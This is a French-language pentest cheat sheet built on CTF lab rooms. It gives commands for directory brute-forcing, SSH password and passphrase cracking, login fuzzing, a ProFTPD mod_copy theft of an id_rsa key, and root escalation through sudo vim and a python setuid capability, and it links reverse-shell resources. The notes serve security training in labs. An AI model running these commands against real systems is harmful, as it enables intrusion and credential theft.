# ![](img/pentest_25.svg) Pentest

## Pentest AD
[Pentest AD MAP](https://www.xmind.net/m/5dypm8/)

## Enumerate local information from a Linux host

[LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
## Outils
### Gobuster

Source : [gobuster](https://www.le-hacking.fr/brute-force-url-gobuster/)

gobuster -h : ```$ gobuster dir -u http://[adresse IP]:[Port] -w [wordlists]```

Exemples :
<br/>```./gobuster dir -u http://10.10.52.129/ -w /usr/share/wfuzz/wordlist/general/common.txt```

### John2ripper

```$ john-the-ripper --wordlist=Outils/wordlist/rockyou.txt id_rsa_basic_hash.txt ```

Permet de retrouver la passphrase pour se connecter en ssh Ã  un user particulier.

### Hydra 

-l = user
<br/>-L = userlist
<br/>-p = password
<br/>-P = passwordlist

```hydra -l test -P /home/petibonum/Outils/wordlist/rockyou.txt 10.10.11.100 ssh```

user = test
<br/>wordlist = rockyou.txt

[Source](https://linuxtrack.net/viewtopic.php?id=654)

### Fuzzing

```wfuzz -c -z file,<file> --sc 200 -d "username=<user>&password=FUZZ" http://<ip>/<path>/```
### ADB connect 

[Source](https://labs.f-secure.com/blog/hackin-around-the-christmas-tree/)
### SMB

Lets inspect one of the shares :
<br/>```smbclient //<ip>/anonymous```

You can recursively download the SMB share too. Submit the username and password as nothing.
<br/>```smbget -R smb://<ip>/anonymous```

### ProFTPD module mod_copy

Exemple : [Kenobi Room](https://tryhackme.com/room/kenobi)

PrÃ©requis : port 21

    PORT   STATE SERVICE
    21/tcp open  ftp

    â”Œâ”€â”€(rootðŸ’€2d2359796bd4)-[/mnt/kenobiNFS]
    â””â”€# nc 10.10.253.117 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.253.117]
    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful

    mkdir /mnt/<name_folder>
    sudo mount <ip_target_machine>:/var /mnt/<name_folder>
    ls -la /mnt/<name_folder>

    cp /mnt/<name_folder>/tmp/id_rsa .
    sudo chmod 600 id_rsa
    ssh -i id_rsa kenobi@10.10.253.117

[Source](http://www.proftpd.org/docs/contrib/mod_copy.html)

## MÃ©thodes
### Escalade de privilÃ¨ge

Exemple : 
* NÂ°1 : TryHackMe -> [SimpleCTF Room](https://tryhackme.com/room/simplectf)

    <br/>```$ sudo -l```
    <br/>ans : User mitch may run the following commands on Machine:
    <br/>ans : (root) NOPASSWD: /usr/bin/vim
    <br/>```$ sudo vim -c ':!/bin/sh'```
    <br/>```# ^[[2;2R^[]11;rgb:3030/0a0a/2424^G```
    <br/>ans : /bin/sh: 1: ot found
    <br/>ans : /bin/sh: 1: 2R: not found
    <br/>```# whoami```
    <br/>ans : root

* NÂ°2 : TryHackMe -> [BasicPentesting Room](https://tryhackme.com/room/basicpentestingjt)
    <br/>```ssh -i /home/<user>/.ssh/id_rsa kay@<ip>```
    <br/> Cette ligne permet de se connecter en ssh Ã  un user par l'intermÃ©diaire d'un autre user prÃ©sent sur la mÃªme machine.

* NÂ°3 : HackTheBox -> [CAP Room](https://app.hackthebox.eu/machines/Cap)

    <br/>```nathan@cap:~$ getcap -r / 2>/dev/null```
    <br/>ans : /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
    <br/>ans : /usr/bin/ping = cap_net_raw+ep
    <br/>ans : /usr/bin/traceroute6.iputils = cap_net_raw+ep
    <br/>ans : /usr/bin/mtr-packet = cap_net_raw+ep
    <br/>ans : /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
    <br/>```nathan@cap:~$/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
    <br/>ans : root@cap:~#
    C'est bon, on est root sur la machine.

* NÂ°4 : TryHackMe -> [Advent of Cyber 2020](https://tryhackme.com/room/adventofcyber2)
    <br/>```python -c 'import pty; pty.spawn("/bin/bash")'```
### Reverse Shell

[Reverse Shell examples](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

### Recherche FIND spÃ©cifique

Rechercher des fichiers avec l'autorisation SUID :
<br/>```find / -user root -perm /4000 2>/dev/null```
<br/>```find / -perm -u=s -type f 2>/dev/null```

### LinPEAS - Linux Privilege Escalation Awesome Script

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

    ```bash=
    git clone https://github.com/carlospolop/PEASS-ng.git
    wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
    ```

### Outils d'encodage

[CyberChef](https://gchq.github.io/CyberChef/)

## Autres Sources

* [Reverse Shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* [SUID vs CAPABILITIES](https://mn3m.info/posts/suid-vs-capabilities/)
* [Linux Privilege Escalation](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)
* [Linux Privilege Escalation with Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
* [Reverse Shell - Synetis](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
